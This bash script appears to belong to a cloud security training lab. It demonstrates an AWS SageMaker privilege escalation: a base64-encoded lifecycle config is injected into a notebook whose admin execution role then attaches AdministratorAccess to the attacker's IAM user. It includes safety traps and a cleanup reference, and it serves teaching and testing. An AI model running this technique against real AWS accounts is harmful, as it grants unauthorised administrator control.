#!/bin/bash

# Demo script for SageMaker UpdateNotebook Lifecycle Config privilege escalation
# This scenario demonstrates how a user with SageMaker update permissions can inject
# a malicious lifecycle configuration into an existing notebook instance to execute
# code with the notebook's admin execution role.


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-sagemaker-005-to-admin-starting-user"
LIFECYCLE_CONFIG_NAME="pl-malicious-lifecycle-config"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}SageMaker UpdateNotebook Lifecycle Config Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_sagemaker_005_sagemaker_updatenotebook_lifecycle_config.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
NOTEBOOK_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.notebook_instance_name')
NOTEBOOK_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.notebook_execution_role_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Target notebook: $NOTEBOOK_NAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Custom exit trap — replaces setup_demo_restriction_trap. If the demo did not complete cleanly
# after the malicious lifecycle config was attached, best-effort stop the notebook to halt any
# in-progress lifecycle script execution (which attaches AdministratorAccess). cleanup_attack.sh
# handles the full restoration (disassociate lifecycle, delete config, detach admin policy).
# Cannot catch SIGKILL from a harness timeout; demo_timeout_seconds in scenario.yaml must cover
# the full 25+ min demo runtime.
DEMO_LIFECYCLE_ATTACHED=0
DEMO_COMPLETED=0

_demo_exit_handler() {
    local exit_code=$?
    trap - EXIT INT TERM

    if [ "$DEMO_LIFECYCLE_ATTACHED" = "1" ] && [ "$DEMO_COMPLETED" != "1" ]; then
        echo ""
        echo -e "\033[0;31m[trap] Demo did not complete cleanly — best-effort stop of $NOTEBOOK_NAME to halt any in-progress lifecycle script execution\033[0m"
        aws sagemaker stop-notebook-instance --notebook-instance-name "$NOTEBOOK_NAME" --region "$AWS_REGION" >/dev/null 2>&1 || true
    fi

    restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml" 2>/dev/null || true
    exit $exit_code
}
trap _demo_exit_handler EXIT INT TERM

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Discover and describe target notebook
echo -e "${YELLOW}Step 5: Discovering target SageMaker notebook instance${NC}"
use_readonly_creds
echo "Listing notebook instances..."
show_cmd "ReadOnly" "aws sagemaker list-notebook-instances --region $AWS_REGION --output table"
aws sagemaker list-notebook-instances --region $AWS_REGION --output table

echo ""
echo "Describing target notebook: $NOTEBOOK_NAME"
show_cmd "ReadOnly" "aws sagemaker describe-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION --output json"
NOTEBOOK_INFO=$(aws sagemaker describe-notebook-instance \
    --notebook-instance-name $NOTEBOOK_NAME \
    --region $AWS_REGION \
    --output json)

NOTEBOOK_STATUS=$(echo $NOTEBOOK_INFO | jq -r '.NotebookInstanceStatus')
NOTEBOOK_ROLE=$(echo $NOTEBOOK_INFO | jq -r '.RoleArn')

echo "Notebook status: $NOTEBOOK_STATUS"
echo "Notebook execution role: $NOTEBOOK_ROLE"
echo ""

echo "Verifying the notebook's execution role has admin permissions..."
show_cmd "ReadOnly" "aws iam list-attached-role-policies --role-name $NOTEBOOK_ROLE_NAME --output table"
aws iam list-attached-role-policies --role-name $NOTEBOOK_ROLE_NAME --output table

echo -e "${GREEN}✓ Target notebook found with admin execution role${NC}\n"

# [EXPLOIT] Step 6: Stop the notebook instance
echo -e "${YELLOW}Step 6: Stopping the notebook instance${NC}"
use_starting_creds
echo "Initial status: $NOTEBOOK_STATUS"

# Wait for notebook to be in a state where it can be stopped (InService or Stopped)
if [ "$NOTEBOOK_STATUS" != "Stopped" ] && [ "$NOTEBOOK_STATUS" != "InService" ]; then
    echo "Notebook is in $NOTEBOOK_STATUS state. Waiting for it to reach InService or Stopped..."
    MAX_WAIT=300  # 5 minutes
    ELAPSED=0
    while [ $ELAPSED -lt $MAX_WAIT ]; do
        use_readonly_creds
        NOTEBOOK_STATUS=$(aws sagemaker describe-notebook-instance \
            --notebook-instance-name $NOTEBOOK_NAME \
            --region $AWS_REGION \
            --query 'NotebookInstanceStatus' \
            --output text)

        echo "  Status: $NOTEBOOK_STATUS (elapsed: ${ELAPSED}s)"

        if [ "$NOTEBOOK_STATUS" == "InService" ] || [ "$NOTEBOOK_STATUS" == "Stopped" ]; then
            echo -e "${GREEN}✓ Notebook is now in $NOTEBOOK_STATUS state${NC}\n"
            break
        fi

        if [ "$NOTEBOOK_STATUS" == "Failed" ]; then
            echo -e "${RED}Error: Notebook is in Failed state${NC}"
            exit 1
        fi

        sleep 15
        ELAPSED=$((ELAPSED + 15))
    done

    if [ "$NOTEBOOK_STATUS" != "InService" ] && [ "$NOTEBOOK_STATUS" != "Stopped" ]; then
        echo -e "${RED}Error: Notebook did not reach a stable state within timeout${NC}"
        exit 1
    fi
fi

if [ "$NOTEBOOK_STATUS" != "Stopped" ]; then
    use_starting_creds
    echo "Stopping notebook instance: $NOTEBOOK_NAME"
    show_attack_cmd "Attacker" "aws sagemaker stop-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION"
    aws sagemaker stop-notebook-instance \
        --notebook-instance-name $NOTEBOOK_NAME \
        --region $AWS_REGION
    echo -e "${GREEN}✓ Stop command sent${NC}\n"

    echo "Waiting for notebook to stop (this may take 2-3 minutes)..."
    MAX_WAIT=300  # 5 minutes
    ELAPSED=0
    while [ $ELAPSED -lt $MAX_WAIT ]; do
        use_readonly_creds
        CURRENT_STATUS=$(aws sagemaker describe-notebook-instance \
            --notebook-instance-name $NOTEBOOK_NAME \
            --region $AWS_REGION \
            --query 'NotebookInstanceStatus' \
            --output text)

        echo "  Status: $CURRENT_STATUS (elapsed: ${ELAPSED}s)"

        if [ "$CURRENT_STATUS" == "Stopped" ]; then
            echo -e "${GREEN}✓ Notebook stopped successfully${NC}\n"
            break
        fi

        sleep 15
        ELAPSED=$((ELAPSED + 15))
    done

    if [ "$CURRENT_STATUS" != "Stopped" ]; then
        echo -e "${RED}Error: Notebook did not stop within timeout${NC}"
        exit 1
    fi
else
    echo "Notebook is already stopped"
    echo -e "${GREEN}✓ Notebook is in Stopped state${NC}\n"
fi

# [EXPLOIT] Step 7: Create malicious lifecycle configuration
echo -e "${YELLOW}Step 7: Creating malicious lifecycle configuration${NC}"
use_starting_creds
echo "This lifecycle config will grant admin access to the starting user..."

# Create the malicious script that will run with the notebook's admin role
LIFECYCLE_SCRIPT='#!/bin/bash

# Disable AWS CLI paging
export AWS_PAGER=""
# This script runs with the notebook execution role credentials (admin access)
echo "Lifecycle script executing with notebook role credentials..."
aws iam attach-user-policy \
    --user-name pl-prod-sagemaker-005-to-admin-starting-user \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
echo "Successfully granted AdministratorAccess to starting user"
'

# Base64 encode the script
ENCODED_SCRIPT=$(echo "$LIFECYCLE_SCRIPT" | base64)

# Create the lifecycle configuration
echo "Creating lifecycle config: $LIFECYCLE_CONFIG_NAME"
show_attack_cmd "Attacker" "aws sagemaker create-notebook-instance-lifecycle-config --notebook-instance-lifecycle-config-name $LIFECYCLE_CONFIG_NAME --region $AWS_REGION --on-start Content="$ENCODED_SCRIPT" --output json"
aws sagemaker create-notebook-instance-lifecycle-config \
    --notebook-instance-lifecycle-config-name $LIFECYCLE_CONFIG_NAME \
    --region $AWS_REGION \
    --on-start Content="$ENCODED_SCRIPT" \
    --output json > /dev/null

echo "Lifecycle configuration created successfully"
echo ""
echo "Script content (base64 decoded):"
echo "-----------------------------------"
echo "$LIFECYCLE_SCRIPT"
echo "-----------------------------------"
echo -e "${GREEN}✓ Malicious lifecycle config created${NC}\n"

# [EXPLOIT] Step 8: Update notebook with malicious lifecycle config
echo -e "${YELLOW}Step 8: Updating notebook with malicious lifecycle config${NC}"
use_starting_creds
echo "Attaching lifecycle config to notebook: $NOTEBOOK_NAME"

show_attack_cmd "Attacker" "aws sagemaker update-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --lifecycle-config-name $LIFECYCLE_CONFIG_NAME --region $AWS_REGION --output json"
# Arm the trap before attaching the malicious lifecycle — from this point, if the demo dies
# before completion, the trap will best-effort stop the notebook to halt lifecycle execution.
DEMO_LIFECYCLE_ATTACHED=1
aws sagemaker update-notebook-instance \
    --notebook-instance-name $NOTEBOOK_NAME \
    --lifecycle-config-name $LIFECYCLE_CONFIG_NAME \
    --region $AWS_REGION \
    --output json > /dev/null

echo -e "${GREEN}✓ Update command sent${NC}\n"

echo "Waiting for update to complete (notebook will return to Stopped status)..."
MAX_WAIT=300  # 5 minutes
ELAPSED=0
while [ $ELAPSED -lt $MAX_WAIT ]; do
    use_readonly_creds
    UPDATE_STATUS=$(aws sagemaker describe-notebook-instance \
        --notebook-instance-name $NOTEBOOK_NAME \
        --region $AWS_REGION \
        --query 'NotebookInstanceStatus' \
        --output text)

    echo "  Status: $UPDATE_STATUS (elapsed: ${ELAPSED}s)"

    if [ "$UPDATE_STATUS" == "Stopped" ]; then
        echo -e "${GREEN}✓ Update complete - notebook is Stopped${NC}\n"
        break
    fi

    if [ "$UPDATE_STATUS" == "Failed" ]; then
        echo -e "${RED}Error: Notebook update failed${NC}"
        exit 1
    fi

    sleep 15
    ELAPSED=$((ELAPSED + 15))
done

if [ "$UPDATE_STATUS" != "Stopped" ]; then
    echo -e "${RED}Error: Notebook did not return to Stopped status within timeout${NC}"
    exit 1
fi

# [EXPLOIT] Step 9: Start the notebook instance (triggers lifecycle script execution)
echo -e "${YELLOW}Step 9: Starting the notebook instance${NC}"
use_starting_creds
echo "Starting notebook: $NOTEBOOK_NAME"

show_attack_cmd "Attacker" "aws sagemaker start-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION"
aws sagemaker start-notebook-instance \
    --notebook-instance-name $NOTEBOOK_NAME \
    --region $AWS_REGION

echo -e "${GREEN}✓ Start command sent${NC}\n"

echo "Waiting for notebook to start and execute lifecycle script (this may take 5-8 minutes)..."
echo "The malicious lifecycle script will execute during startup with admin credentials..."
MAX_WAIT=600  # 10 minutes
ELAPSED=0
while [ $ELAPSED -lt $MAX_WAIT ]; do
    use_readonly_creds
    CURRENT_STATUS=$(aws sagemaker describe-notebook-instance \
        --notebook-instance-name $NOTEBOOK_NAME \
        --region $AWS_REGION \
        --query 'NotebookInstanceStatus' \
        --output text)

    echo "  Status: $CURRENT_STATUS (elapsed: ${ELAPSED}s)"

    if [ "$CURRENT_STATUS" == "InService" ]; then
        echo -e "${GREEN}✓ Notebook is now InService${NC}"
        echo -e "${GREEN}✓ Lifecycle script has executed with admin role${NC}\n"
        break
    fi

    if [ "$CURRENT_STATUS" == "Failed" ]; then
        echo -e "${RED}Error: Notebook startup failed${NC}"
        exit 1
    fi

    sleep 15
    ELAPSED=$((ELAPSED + 15))
done

if [ "$CURRENT_STATUS" != "InService" ]; then
    echo -e "${RED}Error: Notebook did not start within timeout${NC}"
    exit 1
fi

# Step 10: Wait for IAM policy changes to propagate
echo -e "${YELLOW}Step 10: Waiting for IAM policy changes to propagate${NC}"
echo "The lifecycle script has attached AdministratorAccess to our user..."
echo "Waiting 15 seconds for IAM policy propagation..."
sleep 15
echo -e "${GREEN}✓ Policy changes should now be effective${NC}\n"

# [OBSERVATION] Step 11: Verify administrator access
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
use_readonly_creds
echo "Checking if AdministratorAccess is now attached to starting user..."

show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER\" --query 'AttachedPolicies[*].PolicyArn' --output text"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER" \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text 2>/dev/null)

if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER${NC}"
else
    echo -e "${RED}✗ AdministratorAccess policy not found on $STARTING_USER${NC}"
    exit 1
fi
echo ""
echo "Attempting to list IAM users..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo -e "${YELLOW}Note: IAM policy changes can take a few seconds to propagate${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited SageMaker permissions)"
echo "2. Discovered target notebook: $NOTEBOOK_NAME (with admin execution role)"
echo "3. Stopped the notebook instance"
echo "4. Created malicious lifecycle configuration: $LIFECYCLE_CONFIG_NAME"
echo "5. Updated notebook to use malicious lifecycle config"
echo "6. Started notebook - lifecycle script executed with admin role"
echo "7. Lifecycle script attached AdministratorAccess policy to starting user"
echo "8. Achieved: Full administrator access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → StopNotebookInstance → CreateLifecycleConfig"
echo "  → UpdateNotebookInstance → StartNotebookInstance"
echo "  → Lifecycle Script (executes with admin role) → Admin Access"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Lifecycle configuration created: $LIFECYCLE_CONFIG_NAME"
echo "- AdministratorAccess policy attached to: $STARTING_USER"
echo "- Notebook instance modified: $NOTEBOOK_NAME"

echo -e "\n${RED}⚠ Warning: Multiple changes made to the environment${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Demo completed successfully — disarm the best-effort-stop trap.
DEMO_COMPLETED=1

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
